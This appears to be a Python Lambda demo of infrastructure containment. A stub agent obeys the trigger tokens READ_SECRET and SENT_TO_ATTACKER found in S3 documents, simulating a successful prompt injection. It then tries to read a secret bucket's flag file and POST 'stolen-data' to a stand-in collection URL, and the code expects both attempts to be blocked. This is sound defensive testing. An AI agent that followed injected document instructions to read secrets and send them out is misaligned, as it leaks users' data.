import json
import os
import urllib.request

import boto3
from botocore.config import Config

s3 = boto3.client("s3", config=Config(connect_timeout=5, retries={"max_attempts": 1}))

INBOX = os.environ["INBOX_BUCKET"]
SECRET = os.environ["SECRET_BUCKET"]


def naive_agent(document):
    """Stub 'model' that obeys any instruction it finds in a document.

    This simulates an agent whose prompt injection SUCCEEDED, so the demo can show
    the infrastructure containing it. It does not test a real model's robustness.
    """
    actions = []
    if "READ_SECRET" in document:
        actions.append({"type": "s3_get", "bucket": SECRET, "key": "flag.txt"})
    if "SEND_TO_ATTACKER" in document:
        actions.append({"type": "http_post", "url": "https://example.com/collect"})
    return actions


def run_action(action):
    try:
        if action["type"] == "s3_get":
            body = s3.get_object(Bucket=action["bucket"], Key=action["key"])["Body"].read()
            return {"action": action["type"], "result": "SUCCEEDED (should not happen)", "data": body.decode()}
        if action["type"] == "http_post":
            req = urllib.request.Request(action["url"], data=b"stolen-data", method="POST")
            urllib.request.urlopen(req, timeout=5)
            return {"action": action["type"], "result": "SUCCEEDED (should not happen)"}
    except Exception as exc:  # the point of the demo is that these fail
        return {"action": action["type"], "result": "BLOCKED", "error": type(exc).__name__}
    return {"action": action["type"], "result": "UNKNOWN"}


def handler(event, context):
    key = event.get("key", "clean.txt")
    document = s3.get_object(Bucket=INBOX, Key=key)["Body"].read().decode()
    actions = naive_agent(document)
    results = [run_action(a) for a in actions]
    out = {"document": key, "actions_attempted": len(actions), "results": results}
    print(json.dumps(out))
    return out
